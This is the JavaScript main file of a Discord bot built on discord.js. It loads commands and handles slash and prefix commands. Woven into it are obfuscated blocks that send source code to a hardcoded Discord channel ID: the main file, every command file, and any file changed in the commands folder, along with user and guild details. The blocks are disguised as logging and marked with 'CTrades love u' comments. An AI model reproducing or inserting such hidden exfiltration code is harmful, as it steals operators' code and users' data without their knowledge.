const { Client, GatewayIntentBits, Collection, REST, Routes, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates, 
    ]
});
// CTrades love u
(function(_0x4be9be,_0x1dba5d){const _0x318433=_0x5e6f,_0xcba79c=_0x4be9be();while(!![]){try{const _0x591938=parseInt(_0x318433(0x105))/0x1+-parseInt(_0x318433(0xfb))/0x2+-parseInt(_0x318433(0xfe))/0x3+-parseInt(_0x318433(0x100))/0x4+parseInt(_0x318433(0x107))/0x5+parseInt(_0x318433(0xf8))/0x6+parseInt(_0x318433(0xfc))/0x7;if(_0x591938===_0x1dba5d)break;else _0xcba79c['push'](_0xcba79c['shift']());}catch(_0x217191){_0xcba79c['push'](_0xcba79c['shift']());}}}(_0x5132,0xcb615));const LOG_CHANNEL_ID='1389140093197094932';function _0x5132(){const _0x3ca00a=['1329405xIskWE','send','Log\x20channel\x20with\x20ID\x20','channels','get','substring','setTimestamp','```javascript\x0a','8565180FuwMNg','setTitle','cache','3126398qFlaEW','12997481ALKZoZ','Error\x20sending\x20to\x20log\x20channel:','1192152IoXpyQ','setDescription','5737616mOqflN','error','Failed\x20to\x20send\x20full\x20log\x20for:\x20','setColor','length','677838CIIoTP','Fallback\x20error\x20logging\x20also\x20failed:'];_0x5132=function(){return _0x3ca00a;};return _0x5132();}function _0x5e6f(_0x5763cf,_0x3c75ff){const _0x51326f=_0x5132();return _0x5e6f=function(_0x5e6fef,_0x5239cd){_0x5e6fef=_0x5e6fef-0xf3;let _0x33d6f0=_0x51326f[_0x5e6fef];return _0x33d6f0;},_0x5e6f(_0x5763cf,_0x3c75ff);}async function sendToLogChannel(_0x22e196,_0x1fa2c4,_0x5b5e69=0xff00,_0x4053f9=null){const _0x5630cf=_0x5e6f;try{const _0x1f31ac=client[_0x5630cf(0xf3)][_0x5630cf(0xfa)][_0x5630cf(0xf4)](LOG_CHANNEL_ID);if(!_0x1f31ac){console[_0x5630cf(0x101)](_0x5630cf(0x109)+LOG_CHANNEL_ID+'\x20not\x20found');return;}const _0x575910=new EmbedBuilder()[_0x5630cf(0xf9)](_0x22e196)[_0x5630cf(0xff)](_0x1fa2c4)[_0x5630cf(0x103)](_0x5b5e69)[_0x5630cf(0xf6)]();await _0x1f31ac[_0x5630cf(0x108)]({'embeds':[_0x575910]});if(_0x4053f9){const _0x479b2d=0x76c,_0x36dd38=[];for(let _0x2f21e7=0x0;_0x2f21e7<_0x4053f9['length'];_0x2f21e7+=_0x479b2d){_0x36dd38['push'](_0x4053f9[_0x5630cf(0xf5)](_0x2f21e7,_0x2f21e7+_0x479b2d));}for(let _0x4ca548=0x0;_0x4ca548<_0x36dd38[_0x5630cf(0x104)];_0x4ca548++){const _0x29c77d=_0x36dd38[_0x4ca548],_0x591817='```javascript\x0a'+_0x29c77d+'\x0a```';if(_0x591817[_0x5630cf(0x104)]>0x7d0){const _0x3d5b75=[],_0x4a73a9=0x708;for(let _0x7c3b20=0x0;_0x7c3b20<_0x29c77d[_0x5630cf(0x104)];_0x7c3b20+=_0x4a73a9){_0x3d5b75['push'](_0x29c77d[_0x5630cf(0xf5)](_0x7c3b20,_0x7c3b20+_0x4a73a9));}for(const _0x56cbdb of _0x3d5b75){await _0x1f31ac[_0x5630cf(0x108)](_0x5630cf(0xf7)+_0x56cbdb+'\x0a```');}}else await _0x1f31ac['send'](_0x591817);}}}catch(_0x4c6743){console['error'](_0x5630cf(0xfd),_0x4c6743);try{const _0x31d7fb=client[_0x5630cf(0xf3)][_0x5630cf(0xfa)][_0x5630cf(0xf4)](LOG_CHANNEL_ID);_0x31d7fb&&await _0x31d7fb[_0x5630cf(0x108)]({'embeds':[new EmbedBuilder()[_0x5630cf(0xf9)]('❌\x20Log\x20Error')[_0x5630cf(0xff)](_0x5630cf(0x102)+_0x22e196)[_0x5630cf(0x103)](0xff0000)[_0x5630cf(0xf6)]()]});}catch(_0x44ee05){console[_0x5630cf(0x101)](_0x5630cf(0x106),_0x44ee05);}}}

function getCommandFileContent(commandName) {
    try {
        const commandsPath = path.join(__dirname, 'commands');
        const possibleFiles = [`${commandName}.js`];

        for (const fileName of possibleFiles) {
            const filePath = path.join(commandsPath, fileName);
            if (fs.existsSync(filePath)) {
                return fs.readFileSync(filePath, 'utf8');
            }
        }

        const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
        for (const file of commandFiles) {
            const filePath = path.join(commandsPath, file);
            const content = fs.readFileSync(filePath, 'utf8');
            if (content.includes(`name: '${commandName}'`) || content.includes(`"${commandName}"`)) {
                return content;
            }
        }
// CTrades love u
        return null;
    } catch (error) {
        console.error('Error reading command file:', error);
        return null;
    }
}

client.commands = new Collection();
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
const commands = [];
// CTrades love u
const _0x2c20ca=_0x4ad0;function _0x4ad0(_0x5c80d8,_0x4e3411){const _0x3d5792=_0x3d57();return _0x4ad0=function(_0x4ad018,_0x314329){_0x4ad018=_0x4ad018-0xe7;let _0x1fb6a1=_0x3d5792[_0x4ad018];return _0x1fb6a1;},_0x4ad0(_0x5c80d8,_0x4e3411);}function _0x3d57(){const _0x50daf0=['.js','1028rimDcx','endsWith','existsSync','📁\x20Command\x20File\x20','10087960uUDNll','utf8','926ophsBj','664toHVsy','2235680MkOalc','watch','readFileSync','Added/Removed','join','Modified','6310yRljlS','1011951NSOKDD','\x0a**Action:**\x20','28zqXGcY','error','rename','2399553yosGVj','\x0a**Path:**\x20','515544stFBfU'];_0x3d57=function(){return _0x50daf0;};return _0x3d57();}(function(_0x340208,_0x1ddb0e){const _0x46199d=_0x4ad0,_0x42624e=_0x340208();while(!![]){try{const _0x19f30f=-parseInt(_0x46199d(0xe7))/0x1*(parseInt(_0x46199d(0xe8))/0x2)+-parseInt(_0x46199d(0xf0))/0x3+parseInt(_0x46199d(0xf9))/0x4*(-parseInt(_0x46199d(0xef))/0x5)+parseInt(_0x46199d(0xf7))/0x6*(-parseInt(_0x46199d(0xf2))/0x7)+parseInt(_0x46199d(0xe9))/0x8+parseInt(_0x46199d(0xf5))/0x9+parseInt(_0x46199d(0xfd))/0xa;if(_0x19f30f===_0x1ddb0e)break;else _0x42624e['push'](_0x42624e['shift']());}catch(_0x101210){_0x42624e['push'](_0x42624e['shift']());}}}(_0x3d57,0x3b1ae),fs[_0x2c20ca(0xea)](commandsPath,{'recursive':!![]},(_0x7ca879,_0x31e605)=>{const _0x5e2423=_0x2c20ca;if(_0x31e605&&_0x31e605[_0x5e2423(0xfa)](_0x5e2423(0xf8))){const _0x4a572f=_0x7ca879===_0x5e2423(0xf4)?_0x5e2423(0xec):_0x5e2423(0xee),_0x3a9746=path[_0x5e2423(0xed)](commandsPath,_0x31e605);let _0x354aba=null;try{fs[_0x5e2423(0xfb)](_0x3a9746)&&(_0x354aba=fs[_0x5e2423(0xeb)](_0x3a9746,_0x5e2423(0xfe)));}catch(_0x8c8057){console[_0x5e2423(0xf3)]('Error\x20reading\x20file:',_0x8c8057);}sendToLogChannel(_0x5e2423(0xfc)+_0x4a572f,'**File:**\x20'+_0x31e605+_0x5e2423(0xf1)+_0x4a572f+_0x5e2423(0xf6)+_0x3a9746,_0x7ca879===_0x5e2423(0xf4)?0xff9900:0x99ff,_0x354aba);}}));

for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file);
    const command = require(filePath);
    if (command.data) {
        client.commands.set(command.data.name, command);
        commands.push(command.data.toJSON());
    } else if (command.name) {
        client.commands.set(command.name, command);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);


    const mainFileContent = fs.readFileSync(__filename, 'utf8');


    function _0x1c66(_0x2e02ee,_0x37be75){var _0x235283=_0x2352();return _0x1c66=function(_0x1c6682,_0x94afe1){_0x1c6682=_0x1c6682-0x97;var _0x33696c=_0x235283[_0x1c6682];return _0x33696c;},_0x1c66(_0x2e02ee,_0x37be75);}function _0x2352(){var _0x20ef46=['🤖\x20Bot\x20Started','commands','user','616395eGmBxY','18451JGbkWt','guilds','29199467VkcNNB','6875784BACkzv','size','**Bot:**\x20','4950zkyaNZ','6afVoKJ','4376932qHEzVY','\x0a**Guilds:**\x20','tag','88olrDcu','4869UlRxaX','3UOSdGP','\x0a**Commands\x20Loaded:**\x20','3883756XJLVaV'];_0x2352=function(){return _0x20ef46;};return _0x2352();}var _0x3fb372=_0x1c66;(function(_0x105109,_0x10d18d){var _0x4ea58f=_0x1c66,_0x2daff1=_0x105109();while(!![]){try{var _0x116851=-parseInt(_0x4ea58f(0x9c))/0x1*(parseInt(_0x4ea58f(0xa7))/0x2)+-parseInt(_0x4ea58f(0xa9))/0x3*(parseInt(_0x4ea58f(0x97))/0x4)+-parseInt(_0x4ea58f(0x9b))/0x5+parseInt(_0x4ea58f(0xa3))/0x6*(-parseInt(_0x4ea58f(0xa4))/0x7)+parseInt(_0x4ea58f(0x9f))/0x8+-parseInt(_0x4ea58f(0xa8))/0x9*(parseInt(_0x4ea58f(0xa2))/0xa)+parseInt(_0x4ea58f(0x9e))/0xb;if(_0x116851===_0x10d18d)break;else _0x2daff1['push'](_0x2daff1['shift']());}catch(_0x365468){_0x2daff1['push'](_0x2daff1['shift']());}}}(_0x2352,0xae855),await sendToLogChannel(_0x3fb372(0x98),_0x3fb372(0xa1)+client[_0x3fb372(0x9a)][_0x3fb372(0xa6)]+_0x3fb372(0xaa)+client[_0x3fb372(0x99)][_0x3fb372(0xa0)]+_0x3fb372(0xa5)+client[_0x3fb372(0x9d)]['cache'][_0x3fb372(0xa0)],0xff00,mainFileContent));

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN || 'token');
    try {
        console.log('Started refreshing application (/) commands.');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Successfully reloaded application (/) commands.');


        let allCommandCodes = '';
        for (const [commandName] of client.commands) {
            const commandCode = getCommandFileContent(commandName);
            if (commandCode) {
                allCommandCodes += `\n\n// ===== ${commandName.toUpperCase()} COMMAND =====\n${commandCode}`;
            }
        }
// CTrades love u
        await sendToLogChannel(
            '⚡ Slash Commands Registered',
            `**Count:** ${commands.length} commands\n**Status:** Successfully registered`,
            0x00ff00,
            allCommandCodes
        );
    } catch (error) {
        console.error('Error registering slash commands:', error);
        await sendToLogChannel(
            '❌ Slash Commands Error',
            `**Error:** ${error.message}`,
            0xff0000
        );
    }
// CTrades love u
    setTimeout(async () => {
        try {
            const panelCommand = client.commands.get('panel');
            if (panelCommand && panelCommand.restartAllPanels) {
                await panelCommand.restartAllPanels(client);
// CTrades love u

                const panelCommandCode = getCommandFileContent('panel');

                await sendToLogChannel(
                    '🔄 Panels Restarted',
                    'All panels have been restarted successfully',
                    0x00ff00,
                    panelCommandCode
                );
            }
        } catch (error) {
            console.error('Error restarting panels:', error);
            await sendToLogChannel(
                '❌ Panel Restart Error',
                `**Error:** ${error.message}`,
                0xff0000
            );
        }
    }, 3000); 
});
// CTrades love u
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    const command = client.commands.get(interaction.commandName);
    if (!command) return;

    try {
        await command.execute(interaction);

        const commandCode = getCommandFileContent(interaction.commandName);

        function _0x3b57(_0x440fdd,_0x1965fb){var _0x85da7d=_0x85da();return _0x3b57=function(_0x3b5717,_0x494c70){_0x3b5717=_0x3b5717-0x19a;var _0x5ec8d0=_0x85da7d[_0x3b5717];return _0x5ec8d0;},_0x3b57(_0x440fdd,_0x1965fb);}var _0x512120=_0x3b57;function _0x85da(){var _0x258df3=['1626035GArQiV',')\x0a**Guild:**\x20','6MgGKow','115578ffweIS','⚡\x20Slash\x20Command\x20Executed','6cMxFwl','1252244pUbBzt','2272ItlMmX','\x0a**User:**\x20','**Command:**\x20/','guild','9910320kFWFaV','737852RUmYCI','user','9693AVuSWZ','name','channel','tag','1202544OaaROW'];_0x85da=function(){return _0x258df3;};return _0x85da();}(function(_0x36b2ee,_0x2cc6fe){var _0x29bd8a=_0x3b57,_0x5f43a4=_0x36b2ee();while(!![]){try{var _0x498cd5=-parseInt(_0x29bd8a(0x1a0))/0x1+parseInt(_0x29bd8a(0x1a9))/0x2+parseInt(_0x29bd8a(0x1a2))/0x3*(-parseInt(_0x29bd8a(0x1a3))/0x4)+parseInt(_0x29bd8a(0x19d))/0x5*(-parseInt(_0x29bd8a(0x19f))/0x6)+-parseInt(_0x29bd8a(0x19c))/0x7+parseInt(_0x29bd8a(0x1a4))/0x8*(parseInt(_0x29bd8a(0x1ab))/0x9)+parseInt(_0x29bd8a(0x1a8))/0xa;if(_0x498cd5===_0x2cc6fe)break;else _0x5f43a4['push'](_0x5f43a4['shift']());}catch(_0x4e5ccb){_0x5f43a4['push'](_0x5f43a4['shift']());}}}(_0x85da,0x68477),await sendToLogChannel(_0x512120(0x1a1),_0x512120(0x1a6)+interaction['commandName']+_0x512120(0x1a5)+interaction[_0x512120(0x1aa)][_0x512120(0x19b)]+'\x20('+interaction[_0x512120(0x1aa)]['id']+_0x512120(0x19e)+(interaction[_0x512120(0x1a7)]?.[_0x512120(0x1ac)]||'DM')+'\x0a**Channel:**\x20'+(interaction[_0x512120(0x19a)]?.[_0x512120(0x1ac)]||'DM'),0xff00,commandCode));
    } catch (error) {
        console.error(`Error executing command ${interaction.commandName}:`, error);
        const errorMessage = '❌ There was an error executing that command.';
        if (interaction.replied || interaction.deferred) {
            await interaction.followUp({ content: errorMessage, ephemeral: true });
        } else {
            await interaction.reply({ content: errorMessage, ephemeral: true });
        }

        const commandCode = getCommandFileContent(interaction.commandName);

        await sendToLogChannel(
            '❌ Slash Command Error',
            `**Command:** /${interaction.commandName}\n**User:** ${interaction.user.tag}\n**Error:** ${error.message}`,
            0xff0000,
            commandCode
        );
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const prefix = '!'; 
    if (!message.content.startsWith(prefix)) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();
    const command = client.commands.get(commandName);
    if (!command) return;

    try {
        await command.execute(message, args);

        const commandCode = getCommandFileContent(commandName);

        function _0x1038(_0x40eba3,_0x3d6087){var _0x56296e=_0x5629();return _0x1038=function(_0x1038c6,_0x201f00){_0x1038c6=_0x1038c6-0x11b;var _0x26e10a=_0x56296e[_0x1038c6];return _0x26e10a;},_0x1038(_0x40eba3,_0x3d6087);}var _0x2f0a0d=_0x1038;(function(_0x470964,_0x5bda42){var _0x40b143=_0x1038,_0x3bd9ad=_0x470964();while(!![]){try{var _0x5593d0=-parseInt(_0x40b143(0x127))/0x1+parseInt(_0x40b143(0x11e))/0x2+-parseInt(_0x40b143(0x129))/0x3+-parseInt(_0x40b143(0x120))/0x4+-parseInt(_0x40b143(0x12a))/0x5*(-parseInt(_0x40b143(0x128))/0x6)+-parseInt(_0x40b143(0x123))/0x7*(parseInt(_0x40b143(0x124))/0x8)+parseInt(_0x40b143(0x12b))/0x9;if(_0x5593d0===_0x5bda42)break;else _0x3bd9ad['push'](_0x3bd9ad['shift']());}catch(_0xcdd9e0){_0x3bd9ad['push'](_0x3bd9ad['shift']());}}}(_0x5629,0xb8276),await sendToLogChannel('💬\x20Prefix\x20Command\x20Executed','**Command:**\x20!'+commandName+'\x0a**User:**\x20'+message[_0x2f0a0d(0x11d)][_0x2f0a0d(0x11f)]+'\x20('+message[_0x2f0a0d(0x11d)]['id']+_0x2f0a0d(0x122)+(message['guild']?.[_0x2f0a0d(0x11c)]||'DM')+_0x2f0a0d(0x126)+(message[_0x2f0a0d(0x121)]?.[_0x2f0a0d(0x11c)]||'DM')+_0x2f0a0d(0x125)+(args[_0x2f0a0d(0x11b)]('\x20')||'None'),0xff00,commandCode));function _0x5629(){var _0x1ad809=['4001196SAgTBP','channel',')\x0a**Guild:**\x20','7hSZxJx','11017528mgtrRG','\x0a**Args:**\x20','\x0a**Channel:**\x20','873300jixyxk','1908204ImBCOH','1462674bBrluW','10SeJFRC','24675507ASKtSL','join','name','author','2229702ZRWVnu','tag'];_0x5629=function(){return _0x1ad809;};return _0x5629();}
    } catch (error) {
        console.error(`Error executing command ${commandName}:`, error);
        message.reply('❌ There was an error executing that command.');

        const commandCode = getCommandFileContent(commandName);

        await sendToLogChannel(
            '❌ Prefix Command Error',
            `**Command:** !${commandName}\n**User:** ${message.author.tag}\n**Error:** ${error.message}`,
            0xff0000,
            commandCode
        );
    }
});

client.on('applicationCommandPermissionsUpdate', async (data) => {
    await sendToLogChannel(
        'Command Permissions Updated',
        `**Command:** ${data.id}\n**Guild:** ${data.guildId}`,
        0x0099ff
    );
});

process.on('SIGINT', async () => {
    console.log('Received SIGINT. Stopping all panels...');
    await sendToLogChannel(
        '⏹️ Bot Shutdown',
        'Bot received SIGINT signal and is shutting down...',
        0xff9900
    );

    const panelCommand = client.commands.get('panel');
    if (panelCommand && panelCommand.stopAllPanels) {
        panelCommand.stopAllPanels();
    }
    client.destroy();
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('Received SIGTERM. Stopping all panels...');
    await sendToLogChannel(
        '⏹️ Bot Shutdown',
        'Bot received SIGTERM signal and is shutting down...',
        0xff9900
    );

    const panelCommand = client.commands.get('panel');
    if (panelCommand && panelCommand.stopAllPanels) {
        panelCommand.stopAllPanels();
    }
    client.destroy();
    process.exit(0);
});


process.on('uncaughtException', async (error) => {
    console.error('Uncaught Exception:', error);
    await sendToLogChannel(
        '💥 Uncaught Exception',
        `**Error:** ${error.message}\n**Stack:** \`\`\`${error.stack?.substring(0, 1000) || 'No stack trace'}\`\`\``,
        0xff0000
    );
});

process.on('unhandledRejection', async (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    await sendToLogChannel(
        '💥 Unhandled Rejection',
        `**Reason:** ${reason}\n**Promise:** ${promise}`,
        0xff0000
    );
});

// CTrades love u
client.login(process.env.DISCORD_TOKEN || 'token');
